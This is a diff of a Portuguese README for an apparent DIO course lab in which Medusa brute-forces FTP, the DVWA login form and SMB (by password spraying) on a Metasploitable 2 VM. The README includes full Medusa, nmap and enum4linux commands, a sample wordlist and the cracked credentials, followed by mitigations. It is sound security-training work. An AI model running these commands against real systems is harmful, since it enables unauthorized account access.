@@ -1,93 +1,148 @@
-🔐 Desafio de Cibersegurança — Ataques de Força Bruta com Medusa
+# 🔐 Desafio de Cibersegurança  
+## Ataques de Força Bruta com Medusa, Kali Linux e Ambientes Vulneráveis
 
-Este repositório apresenta a documentação prática do desafio de cibersegurança utilizando Kali Linux, Medusa, Metasploitable 2 e DVWA, para simular ataques de força bruta em um ambiente controlado.
+Este repositório documenta a execução prática do desafio de cibersegurança utilizando **Kali Linux**, **Medusa**, **Metasploitable 2** e **DVWA**, simulando ataques de força bruta em serviços FTP, Web e SMB.
 
-Todo o projeto foi estruturado conforme as diretrizes do desafio da DIO.
+O objetivo é demonstrar entendimento dos conceitos, ferramentas e medidas de mitigação em ambientes controlados.
 
-🏗️ 1. Arquitetura do Ambiente
+---
 
-Foram consideradas duas VMs no VirtualBox:
+# 🏗️ 1. Arquitetura do Ambiente
 
-Máquina	Sistema	Função	Rede
-Kali Linux	Kali Rolling	Atacante	Host-Only
-Metasploitable 2	Sistema Vulnerável	Serviços FTP/DVWA/SMB	Host-Only
+As máquinas virtuais utilizadas seguem a arquitetura abaixo:
 
-Ambas configuradas para comunicação local entre si.
+| Máquina | Sistema | Função | Rede |
+|--------|----------|---------|---------|
+| **Kali Linux** | Kali Rolling | Atacante | Host-Only |
+| **Metasploitable 2** | Linux Vulnerável | Alvo (FTP, SMB, DVWA) | Host-Only |
 
-🔎 2. Varredura e Enumeração com Nmap
+Configurações adicionais:
+- Comunicação interna via Host-Only  
+- Testes de conectividade via `ping`  
+- DVWA configurado com nível de segurança **Low**
 
-Comando utilizado:
+---
 
+# 🔎 2. Varredura de Serviços com Nmap
+
+Os serviços foram identificados com o comando:
+
+```bash
 nmap -sV -Pn 192.168.56.101
+```
 
+Serviços relevantes detectados:
 
-Serviços identificados:
+- **FTP (21)**
+- **SSH (22)**
+- **Apache Web Server (80)**
+- **Samba SMB (445)**
 
-FTP (21)
+As evidências encontram-se na pasta `/images`.
 
-SSH (22)
+---
 
-Apache Web (80)
+# 🔐 3. Ataque de Força Bruta (FTP) com Medusa
 
-Samba SMB (445)
+### 📄 Wordlist utilizada
+Local: `wordlists/passwords.txt`
 
-🔐 3. Ataque de Força Bruta em FTP (Medusa)
+Exemplo de entradas:
+```
+admin
+password
+123456
+msfadmin
+kali
+toor
+```
 
-Wordlist localizada em:
-/wordlists/passwords.txt
-
-Comando:
-
+### ▶️ Comando executado:
+```bash
 medusa -h 192.168.56.101 -u msfadmin -P wordlists/passwords.txt -M ftp
+```
 
+### ✅ Resultado esperado:
+Credenciais válidas identificadas:
+```
+msfadmin : msfadmin
+```
 
-Resultado esperado:
-Senha encontrada → msfadmin
+---
 
-🌐 4. Força Bruta em Formulário Web (DVWA)
+# 🌐 4. Força Bruta em Formulário Web (DVWA)
 
-DVWA configurado com:
+Configurações iniciais:
+- Usuário padrão: `admin`
+- Nível de segurança do DVWA: **Low**
 
-Usuário padrão: admin
-
-Security Level: Low
-
-Comando executado:
-
+### ▶️ Comando utilizado:
+```bash
 medusa -h 192.168.56.101 -u admin -P wordlists/passwords.txt -M http \
  -m FORM:"/dvwa/login.php" \
  -m FORM-DATA:"username=^USER^&password=^PASS^&Login=Login" \
  -m ACCEPT:"Login failed"
+```
 
+### ✅ Resultado:
+Senha válida encontrada:
+```
+admin : password
+```
 
-Senha válida: password
+---
 
-📡 5. Password Spraying em SMB
+# 📡 5. Password Spraying em SMB
 
-Enumeração de usuários:
-
+### 5.1 Enumeração de usuários:
+```bash
 enum4linux -U 192.168.56.101
+```
 
+Usuários obtidos (exemplo):
+```
+msfadmin
+user
+service
+```
 
-Ataque:
+Lista armazenada em:  
+`wordlists/users.txt`
 
+### 5.2 Password spraying:
+Tentativa da mesma senha para vários usuários:
+
+```bash
 medusa -h 192.168.56.101 -U wordlists/users.txt -p msfadmin -M smbnt
+```
 
-🛡️ 6. Mitigações Recomendadas
+---
 
-Política de senhas fortes.
+# 🛡️ 6. Medidas de Mitigação
 
-Bloqueio após tentativas incorretas.
+Com base nos vetores explorados, as seguintes recomendações podem reduzir riscos:
 
-Uso de MFA.
+### 🔐 Senhas e autenticação
+- Implementar senhas fortes e políticas de expiração.  
+- Utilizar MFA sempre que possível.  
 
-Desativação de serviços desnecessários.
+### 🧱 Fortalecimento de serviços
+- Desabilitar serviços desnecessários (ex.: FTP).  
+- Configurar lockout após tentativas falhas.
 
-Monitoramento de logs.
+### 📈 Monitoramento e Logs
+- Implementar ferramentas de detecção como **Fail2ban**.  
+- Verificar logs com regularidade (SSH, Apache, Samba).
 
-Aplicação de patches e atualizações.
+### 🔄 Atualizações
+- Manter sistemas e serviços atualizados.  
+- Aplicar patches de segurança assim que lançados.
 
-📁 7. Estrutura do Repositório
+---
+
+# 📁 7. Estrutura do Repositório
+
+```
 /desafio-medusa-bruteforce
 ├── README.md
 ├── /images
@@ -98,7 +153,21 @@ Aplicação de patches e atualizações.
 └── /scripts
     ├── scan_nmap.sh
     └── ftp_bruteforce.sh
+```
 
-🏁 8. Conclusão
+---
 
-Este projeto demonstra como ataques de força bruta funcionam em diferentes serviços, reforçando a importância de práticas de segurança como autenticação forte, hardening, monitoramento e redução de superfície de ataque.
+# 🏁 8. Conclusão
+
+Este projeto demonstra na prática como ataques de força bruta operam em diferentes vetores (FTP, Web e SMB), reforçando a importância de:
+
+- boas práticas de autenticação,  
+- hardening de serviços,  
+- monitoramento contínuo e  
+- redução da superfície de ataque.
+
+O conteúdo foi preparado de forma clara e organizada para fins educacionais e documentação no portfólio técnico.
+
+---
+
+📌 Este repositório atende aos requisitos do desafio da DIO e pode ser enviado como entrega final.
